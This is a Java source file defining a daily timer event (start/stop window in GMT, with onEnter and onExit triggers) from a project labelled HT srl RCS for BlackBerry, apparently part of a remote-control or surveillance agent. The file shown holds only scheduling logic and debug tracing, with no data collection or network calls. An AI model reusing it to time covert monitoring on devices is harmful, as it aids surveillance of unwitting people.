//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : TimerEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.util.Calendar;
import java.util.Date;
import java.util.TimeZone;

import blackberry.config.ConfEvent;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

/**
 * The Class TimerEvent.
 */
public final class EventTimer extends Event {

    //#ifdef DEBUG
    private static Debug debug = new Debug("TimerEvent", DebugLevel.VERBOSE);
    //#endif

    /** The Constant SLEEP_TIME. */
    private static final int SLEEP_TIME = 1000;

    boolean nextDailyIn;

    /** The type. */
    private int type;

    long start, stop;

    private final long oneDayMs = 24 * 3600 * 1000;

    private Date timestart;

    private Date timestop;

    public boolean parse(final ConfEvent conf) {
        //SimpleDateFormat df = new SimpleDateFormat("HH:mm:ss");
        try {
            timestart = conf.getDate("ts");
            timestop = conf.getDate("te");
        } catch (ConfigurationException e) {
            return false;
        }

        //#ifdef DEBUG
        debug.trace(" type: " + type + " ts:" + timestart + " te:" + timestop);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
        //#endif

        return true;
    }

    public void actualStart() {
        final long now = System.currentTimeMillis();
        Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone("GMT"));

        long nextStart, nextStop;

        calendar.setTime(timestart);
        start = ((calendar.get(Calendar.HOUR_OF_DAY) * 3600)
                + (calendar.get(Calendar.MINUTE) * 60) + calendar
                .get(Calendar.SECOND)) * 1000;

        calendar.setTime(timestop);
        stop = ((calendar.get(Calendar.HOUR_OF_DAY) * 3600)
                + (calendar.get(Calendar.MINUTE) * 60) + calendar
                .get(Calendar.SECOND)) * 1000;

        nextDailyIn = setDailyDelay(true);

    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualGo() {
        //#ifdef DEBUG
        debug.trace(" Info: " + "triggering");//$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        if (nextDailyIn) {
            //#ifdef DEBUG
            debug.trace(" (go): DAILY TIMER: action enter"); //$NON-NLS-1$
            //#endif
            onEnter();
        } else {
            //#ifdef DEBUG
            debug.trace(" (go): DAILY TIMER: action exit"); //$NON-NLS-1$
            //#endif
            onExit();
        }

        //#ifdef DEBUG
        debug.trace(" (go): daily IN BEFORE: " + nextDailyIn); //$NON-NLS-1$
        //#endif
        nextDailyIn = setDailyDelay(false);
        //#ifdef DEBUG
        debug.trace(" (go): daily IN AFTER: " + nextDailyIn); //$NON-NLS-1$
        //#endif
    }

    public void actualStop() {
        onExit(); // di sicurezza
    }

    private boolean setDailyDelay(boolean initialCheck) {
        Calendar nowCalendar = Calendar
                .getInstance(TimeZone.getTimeZone("GMT"));

        long nextStart, nextStop;

        int now = ((nowCalendar.get(Calendar.HOUR_OF_DAY) * 3600)
                + (nowCalendar.get(Calendar.MINUTE) * 60) + nowCalendar
                .get(Calendar.SECOND)) * 1000;

        if (initialCheck) {
            initialCheck();
        }
        // Estriamo il prossimo evento e determiniamo il delay sulla base del
        // tipo
        if (now < start)
            nextStart = start;
        else
            nextStart = start + (3600 * 24 * 1000); // 1 Day

        if (now < stop)
            nextStop = stop;
        else
            nextStop = stop + (3600 * 24 * 1000); // 1 Day

        boolean ret;
        // stabilisce quale sara' il prossimo evento.
        if (nextStart < nextStop) {
            //#ifdef DEBUG
            debug.trace(" (setDailyDelay): Delay (next start): " + (nextStart - now)); //$NON-NLS-1$
            //#endif
            if (initialCheck)
                setDelay(nextStart - now);
            else
                setPeriod(nextStart - now);
            ret = true;
        } else {
            //#ifdef DEBUG
            debug.trace(" (setDailyDelay): Delay (next stop): " + (nextStop - now)); //$NON-NLS-1$
            //#endif

            long delay = nextStop - now;
            if (initialCheck)
                setDelay(nextStop - now);
            else
                setPeriod(nextStop - now);
            ret = false;
        }

        return ret;
    }

    private void initialCheck() {
        Calendar nowCalendar = Calendar
                .getInstance(TimeZone.getTimeZone("GMT"));
        int now = ((nowCalendar.get(Calendar.HOUR_OF_DAY) * 3600)
                + (nowCalendar.get(Calendar.MINUTE) * 60) + nowCalendar
                .get(Calendar.SECOND)) * 1000;
        // verifica se al primo giro occorre chiamare OnEnter
        if (start < stop) {
            //#ifdef DEBUG
            debug.trace(" (setDailyDelay): start < stop ");
            //#endif
            if (now > start && now < stop) {
                //#ifdef DEBUG
                debug.trace(" (setDailyDelay): we are already in the brackets");
                //#endif
                onEnter();
            }
        } else {
            //#ifdef DEBUG
            debug.trace(" (setDailyDelay): start > stop ");
            //#endif
            if (now < stop || now > start) {
                //#ifdef DEBUG
                debug.trace(" (setDailyDelay): we are already in the inverted brackets");
                //#endif
                onEnter();
            }
        }
    }

}
